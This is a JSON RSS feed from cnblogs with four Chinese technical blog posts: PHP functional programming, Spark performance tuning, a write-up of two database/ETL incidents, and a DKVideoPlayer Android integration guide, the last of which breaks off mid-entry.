{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "2026 年 PHP 函数式编程 优势与实际应用",
      "link": "https://www.cnblogs.com/catchadmin/p/19497758",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19497758\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 08:26\">\n    <span>2026 年 PHP 函数式编程 优势与实际应用</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"2026-年-php-函数式编程-优势与实际应用\">2026 年 PHP 函数式编程 优势与实际应用</h1>\n<p>函数式编程（FP）已经存在几十年了，但近年来在实际开发中用得越来越多。这篇文章整理一下 FP 的核心概念和实际应用场景。</p>\n<h2 id=\"什么是函数式编程\">什么是函数式编程</h2>\n<p>在深入优势和应用之前，先快速回顾一下函数式编程是什么。</p>\n<p>函数式编程的核心是把计算当作数学函数的求值。它是一种声明式编程风格，描述的是\"要什么\"，而不是\"怎么做\"。在 FP 中，函数是一等公民，可以作为参数传递给其他函数，可以从函数返回，也可以赋值给变量。</p>\n<p>FP 的一个核心原则是不可变性——一旦给变量赋值，就不能再改变。这消除了副作用，让代码更可预测、更容易调试。另一个基本概念是纯函数，对于相同的输入总是产生相同的输出，不会修改任何外部状态。</p>\n<p><a href=\"https://catchadmin.com/post/2026-01/functional-programming-paradigms-2026\" rel=\"noopener nofollow\" target=\"_blank\">原文 2026 年 PHP 函数式编程 优势与实际应用</a></p>\n<h2 id=\"为什么开发者应该关注函数式编程\">为什么开发者应该关注函数式编程</h2>\n<h3 id=\"更简洁更易维护的代码\">更简洁、更易维护的代码</h3>\n<p>函数式编程鼓励编写模块化、易于理解的代码。因为函数是纯的（不修改状态），意外行为的空间更小，代码库更干净。这让调试、测试和后续修改都更容易。</p>\n<p>假设你在做一个 PHP 项目。使用函数式技术可以减少副作用，确保应用逻辑被隔离成更小的、可复用的代码片段。这也让后续更新或重构更容易，因为函数式代码的依赖通常更少。</p>\n<h3 id=\"并发和并行\">并发和并行</h3>\n<p>现代软件的一个挑战是处理并发和并行。随着多核处理器和分布式系统的普及，编写能高效处理多任务的代码比以往更重要。</p>\n<p>函数式编程在这方面有明显优势：因为函数避免修改共享状态，它们天生是线程安全的。这让编写并发应用更容易，不用担心竞态条件或死锁。</p>\n<p>比如一个需要处理大数据集的 PHP 应用。使用不可变数据结构和并行处理技术，可以确保应用的不同部分并发运行而不互相干扰。</p>\n<h3 id=\"更好的抽象和复用\">更好的抽象和复用</h3>\n<p>函数式编程促进高层抽象的创建。函数可以轻松组合、传递，在应用的不同部分复用。</p>\n<p>比如在 PHP 中，与其写重复的代码处理某些操作，不如写小的纯函数，然后灵活地组合起来。这减少了代码重复，更好地遵循 DRY（Don't Repeat Yourself）原则。</p>\n<h3 id=\"php-中的函数式工具\">PHP 中的函数式工具</h3>\n<p>PHP 不是纯函数式语言，但内置的 <code>array_map()</code>、<code>array_filter()</code>、<code>array_reduce()</code> 等函数提供了基本的函数式操作能力。第三方库如 Ramda、Lodash 也可以用。</p>\n<h2 id=\"函数式编程的核心原则\">函数式编程的核心原则</h2>\n<p>下面探讨函数式编程的一些核心原则，以及它们在实际编程中的应用。</p>\n<h3 id=\"不可变性\">不可变性</h3>\n<p>在函数式编程中，数据是不可变的。一旦设置了值，就不能改变。这个概念减少了与可变状态变化相关的 bug，简化了对程序行为的理解。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function addItemToList($list, $item) {\n    // 创建一个包含新元素的新列表\n    return array_merge($list, [$item]);\n}\n\n$list = [1, 2, 3];\n$newList = addItemToList($list, 4);\n\nprint_r($list);     // 输出: [1, 2, 3]（原列表不变）\nprint_r($newList);  // 输出: [1, 2, 3, 4]（包含新元素的新列表）\n</code></pre>\n<p>这个例子中，原始的 <code>$list</code> 保持不变，因为 PHP 数组是按值传递的。这展示了不可变性——原始数据结构被保留，返回的是包含新元素的新结构。</p>\n<h3 id=\"纯函数\">纯函数</h3>\n<p>纯函数对于相同的输入总是产生相同的输出，不会产生任何副作用。这让纯函数可预测且易于测试。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function square($number) {\n    return $number * $number;\n}\n\necho square(4); // 输出: 16\n</code></pre>\n<p><code>square()</code> 函数是纯的，因为对于相同的输入（4）总是产生相同的输出（16），而且不修改任何外部状态。</p>\n<h3 id=\"高阶函数\">高阶函数</h3>\n<p>高阶函数是可以接受其他函数作为参数或返回函数的函数。这实现了强大的抽象和代码复用。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function applyFunction($func, $value) {\n    return $func($value);\n}\n\nfunction double($x) {\n    return $x * 2;\n}\n\necho applyFunction('double', 5); // 输出: 10\n</code></pre>\n<p>这个例子中，<code>applyFunction()</code> 是一个高阶函数，因为它接受另一个函数（<code>double()</code>）作为参数并应用到一个值上。</p>\n<h3 id=\"函数组合\">函数组合</h3>\n<p>函数组合是把简单函数组合成更复杂函数的过程。这让你可以从更小的、可复用的组件构建复杂行为。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function add($x, $y) {\n    return $x + $y;\n}\n\nfunction multiply($x, $y) {\n    return $x * $y;\n}\n\nfunction addThenMultiply($x, $y, $z) {\n    return multiply(add($x, $y), $z);\n}\n\necho addThenMultiply(2, 3, 4); // 输出: 20（add(2, 3) = 5, multiply(5, 4) = 20）\n</code></pre>\n<p>这里，<code>addThenMultiply()</code> 函数展示了如何把更小的函数组合起来创建新功能。这鼓励代码复用和模块化。</p>\n<h2 id=\"函数式编程的实际应用\">函数式编程的实际应用</h2>\n<p>函数式编程不只是理论概念——它正在实际应用中使用。下面看看函数式编程在不同领域的一些实际例子。</p>\n<h3 id=\"数据转换和-etl-流程\">数据转换和 ETL 流程</h3>\n<p>在数据密集型应用中，比如数据转换或 ETL（Extract, Transform, Load）流程，函数式编程表现出色。它让开发者可以不可变地操作大数据集，使用高层抽象进行转换。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">$data = [1, 2, 3, 4, 5];\n\n// 使用函数式方法处理数据\n$result = array_map(fn($x) =&gt; $x * 2, $data);  // 每个值翻倍\n$result = array_filter($result, fn($x) =&gt; $x &gt; 5); // 只保留大于 5 的值\n\nprint_r($result);  // 输出: [6, 8, 10]\n</code></pre>\n<p>这个例子中，我们使用 <code>array_map()</code> 和 <code>array_filter()</code> 不可变地转换和过滤数据集，这是函数式编程中的常见模式。</p>\n<h3 id=\"分布式系统中的并发\">分布式系统中的并发</h3>\n<p>函数式编程对不可变性和纯函数的强调，使它成为并发和并行处理任务的理想选择。你可以放心地编写并发应用，不用担心竞态条件。</p>\n<p>比如，在 PHP 中构建一个并发处理用户请求的分布式系统时，可以确保数据完整性，而不会引入与可变共享状态相关的 bug。</p>\n<h3 id=\"构建-api-端点和微服务\">构建 API 端点和微服务</h3>\n<p>构建微服务或 API 时，函数式编程可以帮助创建简洁、易维护的端点。通过确保每个函数处理特定任务且是纯的、确定性的，可以让每个微服务更容易测试和扩展。</p>\n<h2 id=\"小结\">小结</h2>\n<p>函数式编程的核心是不可变性、纯函数和高阶函数。这些概念在并发处理、数据转换等场景下比较实用。PHP 虽然不是纯函数式语言，但内置函数和第三方库已经提供了足够的支持。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 08:26</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "大数据技术领域发展与Spark的性能优化",
      "link": "https://www.cnblogs.com/zzq6032010/p/19497421",
      "published": "",
      "description": "<h1 class=\"postTitle\"><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/zzq6032010/p/19497421\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 23:59\">\n    <span>大数据技术领域发展与Spark的性能优化</span>\n    \n\n</a>\n</h1>\n\t<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><strong><span style=\"font-size: 15px;\">一、大数据技术领域发展方向</span></strong></p>\n<p>随着AI时代的到来，大数据技术领域逐渐退居二线，再也没有了前些年的重视程度。博主近期结合从业多年经验，对大数据技术领域的技术演进路线做下梳理。</p>\n<p>当前大数据领域发展已经进入深水区，随着各种成熟大数据框架的应用普及，难点已经从存不下、算不出，变为了如何高质量、高效计算数据并增加数据与价值的转换率，这就涉及到针对价值变现场景的数据设计和全生命周期的管理。这部分根据具体业务场景的差异，设计实现千差万别，本文以Spark On Yarn经典大数据集群场景为例，讲一讲如何高效计算数据。</p>\n<p>&nbsp;</p>\n<p><strong><span style=\"font-size: 15px;\">二、Spark On Yarn性能优化思路</span></strong></p>\n<p><strong><span style=\"font-size: 14px;\">1、Spark调参</span></strong></p>\n<p>Spark开放了众多过程参数，来控制集群运行过程中各个维度的设置。常用来参数调优的有：</p>\n<p>spark.default.parallelism：并行度</p>\n<p>spark.sql.shuffle.partitions：shuffle分区数（常为集群Executor核心数的2-3倍）</p>\n<p>spark.executor.memoryOverhead：调节shuffle过程中内存溢出阈值</p>\n<p>spark.dynamicAllocation.enabled=true：启用动态资源分配，任务负载高时可自行增加对资源的申请</p>\n<p>spark.sql.adaptive.enabled=true：开启AQE，自动调节最优分区数，还可改善数据倾斜问题</p>\n<p>上面只是例举其中一小部分，参数调参配合SparkUI使用，方便观测调整效果。</p>\n<p><strong>2、代码端优化</strong></p>\n<p>手段很多，包括但不限于：增加缓存、减少udf的使用、走dataframe或sparksql最大化利用spark原生的引擎优化、使用broadcast等，核心原则是多利用spark优化机制，做好数据缓存。</p>\n<p><strong>3、数据端优化</strong></p>\n<p>数据端优化主要是两部分：</p>\n<p>第一是读取、存储时，采用高效存储格式，如parquet、ORC等，天然适配spark的分区计算模式，会减少很多无谓的操作。</p>\n<p>第二是采用高效序列化方式，减少shuffle过程中的序列化耗时，这部分时间可在SparkUI的Stage处查看task的timeline中的对应耗时。</p>\n<p><strong>4、架构层优化</strong></p>\n<p>上述措施都做完之后，基本就进入了性能优化的深水区，当前业界成熟做法有两大类，均能进一步突破数据计算瓶颈可带来较大幅度提升。</p>\n<p><span style=\"color: rgba(0, 0, 255, 1);\"><strong>第一是利用向量化技术，大幅提升计算效率。</strong></span></p>\n<p>向量化技术能有效果的基础，在于现代计算机对SIMD指令的支持。</p>\n<p>SIMD指令，即单指令流多数据流 Single Instruction Multiple Data，在计算机中可以使用一条指令，传递多个数据进去（即向量），而后CPU仅需对这一个向量进行一次运算（比如当前要进行加法运算），即可得到结果，相比传统CPU一个加法调用一次指令的方式，快了N（N为向量的长度）倍。</p>\n<p>所以向量化改造是一条理论上具备高效提效能力的技术方向。具体实操的话，开源组件推荐使用Gluten，小米技术团队去年做过实践分享，改造之后时间耗时平均降低30%。</p>\n<p><strong><span style=\"color: rgba(0, 0, 255, 1);\">第二是在并行计算路上继续狂奔，引入异构的GPU</span></strong>（注意不是NPU，NPU仅为支持AI训练推理加速，对通用数据计算增益效果并不好，且缺少配套）。</p>\n<p>在GPU计算提效这块，英伟达专门为Spark无缝使用开发了RAPIDS加速器插件。它可以以插件的方式集成到spark客户端中，通过参数开关指定启用。在spark的物理计划生成之后，会被该加速器插件拦截，将其中的CPU算子替换为GPU算子（若评估加速效果不好还可退回成CPU算子），而后在Task执行阶段，RAPIDS会接过该任务进行执行。</p>\n<p>大体，就这些了。单纯的大数据技术领域，可做的新技术演进已经不多了，后面更多的是如何精细化价值转换，给AI给行业赋能。</p>\n<p>后续将沿着AI的方向，进行博文的更新和学习。</p>\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-01-17 23:59</span>&nbsp;\n<a href=\"https://www.cnblogs.com/zzq6032010\">淡墨痕</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "最近遇到的两个技术问题记录",
      "link": "https://www.cnblogs.com/grey-wolf/p/19495709",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/grey-wolf/p/19495709\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 12:23\">\n    <span>最近遇到的两个技术问题记录</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"问题1\">问题1</h1>\n<h2 id=\"背景\">背景</h2>\n<p>有个供内部员工使用的后台管理系统，每天会从上游的一个oa系统的接口同步员工数据，oa系统侧维护了每个员工的id、名称、工作城市等等各类信息，接口响应如下：</p>\n<p><img alt=\"image-20260117104211631\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117104211631.png\" /></p>\n<p>这个id就算是员工的唯一标识，就像工号一样，不会变的那种。因此，我们把接口数据拿到后，就直接落地到我们本地数据库的表中，表的主键虽然设定为自增主键，但是在程序里，我们会直接用oa系统给我们的这个id来设置本地表id的值后再插入。</p>\n<p><img alt=\"image-20260117105119562\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105119562.png\" /></p>\n<p>表结构：</p>\n<p><img alt=\"image-20260117122224831\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117122224831.png\" /></p>\n<p>sql如下：这个sql是自动生成的，默认生成出来的是不带id这种主键字段的，我们手动加了一下：</p>\n<p><img alt=\"image-20260117105019010\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105019010.png\" /></p>\n<p>手动加上id字段：</p>\n<p><img alt=\"image-20260117104906664\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117104906664.png\" /></p>\n<p>结果，最近弄了一个员工报商业保险的活动，简单来说，就是存储一下数据：用户id 、对应的商业保险id。</p>\n<p>报保险的过程中，发现用户表缺了些数据没同步，如用户证件号（报保险需要）、城市等，所以就加了一下这几个字段。</p>\n<p><img alt=\"image-20260117105522469\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105522469.png\" /></p>\n<p>新增完字段后，mapper.xml代码自动生成，也没仔细看，结果就把之前手动加的id字段给冲掉了：</p>\n<p><img alt=\"image-20260117105645320\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105645320.png\" /></p>\n<p>这个上线后，由于在程序中没有指定id字段，就导致本地表中的id变成了使用自增的方式（postgresql，从序列中获取下一个id的值，类似mysql中自增）。</p>\n<p>而且，从oa系统同步员工信息到我方系统，每天都是靠一个定时任务在跑，每天跑的时候：</p>\n<pre><code class=\"language-shell\">1、从oa侧获取员工列表数据\n2、清空本地表\n3、批量插入从oa侧获取的员工数据\n</code></pre>\n<p>这就导致，员工的id，上线后，每天都在变，每天都在变。</p>\n<p>当时我查问题看到这个问题的时候，吓了一跳，当时员工报商业保险正如火如荼呢，我一想：难道得赶紧通知全公司的人，重新报了？而且，当时业务的人和保险公司约定的提供保险人员名单的时间也没几天了。。。</p>\n<p>后面我又仔细看了下，发现问题还没有那么大。</p>\n<p>就是在数据先落地到t_user_sync这个表（这个表和上游oa侧数据保持一模一样，只读不写，便于定位问题）后，还有个定时任务，将数据从t_user_sync转移到我们实际的用户表（sy_user），这个表我们会进行增删改查等等。</p>\n<p><img alt=\"image-20260117110408095\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117110408095.png\" /></p>\n<p>这个定时任务，在将t_user_sync转移到sy_user的过程中，是增量同步的。如，发现zhangsan这个用户时，先查一下sy_user里有没有，没有才插入，插入时，sy_user的id也是用的t_user_sync的id（也就是oa侧的id），有就更新。</p>\n<p>这个增量同步机制，救了我，导致的结果是，虽然t_user_sync中id错了，且每天都在变；但sy_user中的id虽然也是错的，但是不会每天变，而是用到第一次同步t_user_sync时的id。</p>\n<p>只要sy_user表中的id不变，错的也影响不大，至少员工报保险的相关表中的关联关系是没问题的：</p>\n<p>员工id          员工名称    保险名称</p>\n<p>11111(错的)  张三         xxx商业保险</p>\n<p>而我们这个系统中，其他地方也有用到这个用户id的，虽然由于用户id变化导致了关联关系错乱，但是影响毕竟业务影响没那么大，到时候再修复即可。</p>\n<h2 id=\"总结\">总结</h2>\n<p>其实，这个问题就是粗心造成的，当然，客观上，现在手里系统太多，精力分散也是一个原因。</p>\n<p>另外，这个自动生成代码的机制，后期看看这块是否可以优化吧，能把id字段一起生成到xml中是最好。</p>\n<p>如果实在不行的话，也应该考虑，这种表的id字段，就设置为非自增、非空，必须让程序手动设置，也能及时发现问题。</p>\n<h2 id=\"问题2\">问题2</h2>\n<h2 id=\"etl\">etl</h2>\n<p>介绍背景前，先讲讲etl吧：</p>\n<p>在我从业没几年的时候，当时由于接触的都是mysql这种oltp这类业务为主，有时候看到一些招聘岗位写etl，不知道是啥意思。也是这几年才大概了解：</p>\n<pre><code class=\"language-shell\">将企业中分散的数据，集中的输入到数据仓库中的过程，就是 ETL。\n\nExtract（提取）： 从多个异构数据源（如数据库、文件系统、API等）中提取原始数据。数据源可以是关系型数据库（如MySQL、PostgreSQL）、非关系型数据库（如MongoDB、Cassandra）、文件（如CSV、JSON）、API或流式数据源。\n\nTransform（转换）： 对提取的数据进行清洗、标准化、聚合、去重等操作，以满足业务需求或数据分析的要求。这一步可能涉及数据类型转换、格式转换、业务规则应用、数据聚合、数据质量校验等。\n\nLoad（加载）： 将转换后的数据加载到目标存储系统中，通常是数据仓库或数据湖中，供后续的数据分析、报表或机器学习等用途。加载的方式可以是全量加载、增量加载或实时加载。\n</code></pre>\n<p><img alt=\"image-20260117113327615\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117113327615.png\" /></p>\n<p>像我们公司，数据库种类又多（oracle、mysql、pg、国产），系统又多，好多系统还是买的，你想要某个系统的数据，要么走接口，要么通过人家的表。一方面，好多买的系统，不喜欢对外提供接口（商业上的考虑，毕竟数据是无价的，让你难以迁移，也就是这几年，感觉新的软件系统才开始注重对外提供api）；另一方面，有时候表很多，有些表也很大，自己写接口去每天同步，工作量也不小，还要申请api key/api secret，还要开通网络，也是挺麻烦的，最终就慢慢习惯了、妥协了，通过数仓etl同步，还是能省一些事吧。</p>\n<h2 id=\"背景-1\">背景</h2>\n<p>另一个c端系统，重要性比上面那个系统重要多了，这两天也出了一个问题。</p>\n<p>这个系统，本来是一个外包同事在维护，由于他所在的公司和我们公司不再合作了，他也就跟着离职了（其实可以和新外包公司签约，不过他说新外包公司不太喜欢）。他开发完成了最后一个功能并完成测试后，还没来得及系统上线，所以上线的事就我来弄。</p>\n<p>我整理了一下上线的各种变更，如sql、nacos配置、xxljob、版本jar包、前端包等等一大堆，写了个文档就提交变更流程了。</p>\n<p>其中一个sql，是给某个数仓同步表加id字段（并新建了序列，设置id字段通过序列来自增），我当时还专门研究了一下：</p>\n<p>我们有两个表，jy_sync_h_logasset （当前表）、jy_sync_h_logasset_history（历史表），两个表的结构类似，只是一个存储最近几个月的数据（jy_sync_h_logasset ），一个存储几个人前的数据（jy_sync_h_logasset_history）。系统会定期把几个月前的数据，从当前表，转移到历史表里去，保证当前表的数据量不要太大，影响查询速度。</p>\n<p>这两个表，有一个问题，就是表没有设置id这种主键，为啥没主键呢，因为jy_sync_h_logasset 这个表的数据，是通过数仓的etl操作，从其他上游数据库搬运过来的。</p>\n<p>jy_sync_h_logasset 对应的上游的话，不一定是一个表，可能是一个视图，或者是一个sql，比如select name,oa_account from employee这种，它的sql中，就没有查询id字段，或者是多表join那种（一对多），就是算有id，也会导致id重复。</p>\n<p>所以，我猜测是这个原因，导致我方的这个表，是没有id字段的，也没弄主键。</p>\n<p>一个表，没有主键，据我所知，在分页查询时，容易不稳定，某一条记录可能会在这一页出现，在下一页继续出现，一般我们解决这种分页查询不稳定的问题，都是会按照某个字段排序，而一般首选就是id字段。</p>\n<p>对于这个没有id字段的表来说，分页查询应该是容易出问题的，所以我猜测，这就是本次sql变更（加id字段，创建序列，设置id字段从序列取值）的原因。</p>\n<p><img alt=\"image-20260117115053690\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117115053690.png\" /></p>\n<p>我当时为啥注意这个sql呢，我发现他只建了一个序列，然后两个表都用了这个序列，我当时多看了两眼，只是有点奇怪，一般来说，每个表会设置一个自己的序列。后来我看到，在将jy_sync_h_logasset表中几个月前的数据转移到jy_sync_h_logasset_history的定时任务中，代码里设置了jy_sync_h_logasset_history的id就直接使用jy_sync_h_logasset中的id，也就是说，jy_sync_h_logasset_history实际并不会使用序列中的值作为id，我也就没管了。当然，出事的确实也不是这个问题。</p>\n<p>周四下午，和运维一块，看着他做完上线变更，想着又了了一个事。结果周五早上，8点多，就给我发消息，说有个xxljob的定时任务失败了。</p>\n<p>我赶紧吃完饭，抱着电脑去找他，看了下，发现报错的原因是：</p>\n<p>一个etl_status的表中，没有查到当天的记录，这个表的用途是：数仓在给我们推送完各个表的数据后，会在etl_status中写入一条成功记录。</p>\n<p>既然这次报错是没查到数仓写的成功记录，是不是数据推送失败了呢，我们赶紧联系了数仓的同事，数仓同事过了会告诉我们说，是数仓在往jy_sync_h_logasset写记录时，报错了，提示对jy_sync_h_logasset_pk这个序列的权限不足。然后我过去找他，仔细聊了下，比如，他那边的一次数仓etl任务，总共要推10个表过来，如果其中一个表失败了，就会导致：不写入etl_status成功记录。但已经推送成功的表（如这里成功了9个表）的数据并不会回退。</p>\n<p>问题是搞清楚了，还是粗心导致的，我当时完全没有想起来序列要给数仓用户授权这个事。</p>\n<p>但这个问题看起来小，导致的影响还是比较大的，由于我们定位这个问题及修复（给数仓用户增加权限，数仓重新推送）花了一些时间，修复时已经过了某个特定的时点了，导致我方已经没有时间再来跑xxljob了（某个xxljob任务由于下游系统的限制，要求必须在某个时点之前跑才行），只能是让业务同事去通知客户道歉。</p>\n<p>部门的领导也介入了这个事情，下周就得系统梳理下现状，再看看有没有在这种异常情况下进行补救的措施，当然，我们这边其实是可以补救的（数仓重新推送数据后，我方也重新执行xxljob相关任务），但是我们系统还有下游（现在就是下游系统不支持过了某个时间点后进行补救），这块还得再看看怎么弄。</p>\n<h2 id=\"总结-1\">总结</h2>\n<p>小小的问题，大大的影响，出了问题再来处理，一般成本是最高的，也会带来更多的工作，如事故汇报、针对事故的改进措施等。还是得防患于未然，治未病。</p>\n<p>当然，我简单看了下，希望postgresql可以做到：新增的序列，不用每次单独授权，而是在数据库级别进行授权。</p>\n<p><img alt=\"image-20260117122000029\" src=\"https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117122000029.png\" /></p>\n<p>下周再研究下吧，和dba沟通下，避免现在权限管的太细导致的问题。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 12:23</span>&nbsp;\n<a href=\"https://www.cnblogs.com/grey-wolf\">三国梦回</a>&nbsp;\n阅读(<span id=\"post_view_count\">162</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "FFmpeg开发笔记（九十九）基于Kotlin的国产开源播放器DKVideoPlayer",
      "link": "https://www.cnblogs.com/aqi00/p/19379646",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/aqi00/p/19379646\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 12:15\">\n    <span>FFmpeg开发笔记（九十九）基于Kotlin的国产开源播放器DKVideoPlayer</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<span id=\"cke_bm_197S\">在Android平台上，基于FFmpeg的国产播放器开源框架也有很多了，前有哔哩哔哩的ijkplayer，后有小红书的RedPlayer，参见之前的文章《使用国产的ijkplayer播放器观看网络视频》和《使用国产的RedPlayer播放器观看网络视频》。</span>\n<p><span id=\"cke_bm_197S\"> 除此以外，DKVideoPlayer也是一款优秀的国产Android视频播放器，它基于Kotlin编写，不但集成了Android原生的MediaPlayer，还集成了Jetpack的ExoPlayer，甚至集成了国产的ijkplayer。DKVideoPlayer既支持播放本地视频，也支持播放网络视频，甚至支持播放直播链接，可谓功能强大。<br />\nDKVideoPlayer的源码托管地址为https://github.com/Doikki/DKVideoPlayer（星星数5.3k），国内的镜像地址为https://gitcode.com/gh_mirrors/dk/DKVideoPlayer，最新版本是2022年7月发布的v3.3.7，可见该框架的源码更新十分及时，该版本的源码下载地址为https://github.com/Doikki/DKVideoPlayer/archive/refs/tags/3.3.7.tar.gz。<br />\nDKVideoPlayer提供了两种集成方式，引用在线库、直接导入源码，分别说明如下：</span></p>\n<h1>一、引用DKVideoPlayer在线库</h1>\n<p>Android工程引用DKVideoPlayer在线库时，需要修改以下两个配置：<br />\n1、打开模块级别的build.gradle，给dependencies节点补充下面几行配置，表示引入3.3.7版本的DKVideoPlayer库：</p>\n<div class=\"cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected\">\n<pre class=\"cke_widget_element\"><code class=\"hljs\"># 必选，内部默认使用系统mediaplayer进行解码\nimplementation 'xyz.doikki.android.dkplayer:dkplayer-java:3.3.7'\n# 可选，包含StandardVideoController的实现\nimplementation 'xyz.doikki.android.dkplayer:dkplayer-ui:3.3.7'\n# 可选，使用exoplayer进行解码\nimplementation 'xyz.doikki.android.dkplayer:player-exo:3.3.7'\n# 可选，使用ijkplayer进行解码\nimplementation 'xyz.doikki.android.dkplayer:player-ijk:3.3.7'\n# 可选，如需要缓存或者抖音预加载功能请引入此库\nimplementation 'xyz.doikki.android.dkplayer:videocache:3.3.7'</code></pre>\n</div>\n<p>2、打开App模块的src/main/AndroidManifest.xml，给manifest节点补充下面几行权限配置，表示声明悬浮窗、存储空间和网络等权限：</p>\n<div class=\"cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected\">\n<pre class=\"cke_widget_element\"><code class=\"hljs\">&lt;uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\" /&gt;\n&lt;uses-permission android:name=\"android.permission.SYSTEM_OVERLAY_WINDOW\" /&gt;\n&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt;\n&lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n&lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/&gt;</code></pre>\n</div>\n<h1>二、直接导入DKVideoPlayer源码</h1>\n<p>DKVideoPlayer的源码已经适配Android Studio Dolphin（小海豚版本），仅需在项目级别的build.gradle补充国内仓库即可。也就是在repositories节点内部补充以下配置：</p>\n<div class=\"cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected\">\n<pre class=\"cke_widget_element\"><code class=\"hljs\">// 以下四行添加阿里云的仓库地址，方便国内开发者下载相关插件\nmaven { url = uri(\"https://maven.aliyun.com/repository/jcenter\") }\nmaven { url = uri(\"https://maven.aliyun.com/repository/google\")}\nmaven { url = uri(\"https://maven.aliyun.com/repository/gradle-plugin\")}\nmaven { url = uri(\"https://maven.aliyun.com/repository/public\")}\n// 以下添加清华大学的仓库地址\nmaven { url = uri(\"https://mirrors.tuna.tsinghua.edu.cn/repository/maven-central/\") }</code></pre>\n</div>\n<p>增加以上配置的目的是引入国内的仓库地址，以便加快相关依赖包的下载速度。</p>\n<p>等待DKVideoPlayer工程编译通过，把主入口的dkplayer-sample模块安装到手机上，启动之后的App界面如下图所示：</p>\n<p><span class=\"cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected\"><span class=\"cke_reset cke_widget_drag_handler_container\"><span class=\"cke_image_resizer\" title=\"点击并拖拽以改变尺寸\"><span class=\"cke_widget_edit_container\" title=\"编辑图片\"><img alt=\"dkplayer1\" class=\"lazyload\" height=\"468\" width=\"410\" /></span></span></span></span></p>\n<p>点击【点播】按钮，打开网络视频的播放界面如下图所示：</p>\n<p><span class=\"cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected\"><span class=\"cke_reset cke_widget_drag_handler_container\"><span class=\"cke_image_resizer\" title=\"点击并拖拽以改变尺寸\"><span class=\"cke_widget_edit_container\" title=\"编辑图片\"><img alt=\"dkplayer2\" class=\"lazyload\" height=\"609\" width=\"403\" /></span></span></span></span></p>\n<p>或者点击【直播】按钮，打开直播链接的播放界面如下图所示：</p>\n<p><span class=\"cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected\"><span class=\"cke_reset cke_widget_drag_handler_container\"><span class=\"cke_image_resizer\" title=\"点击并拖拽以改变尺寸\"><span class=\"cke_widget_edit_container\" title=\"编辑图片\"><img alt=\"dkplayer3\" class=\"lazyload\" height=\"608\" width=\"403\" 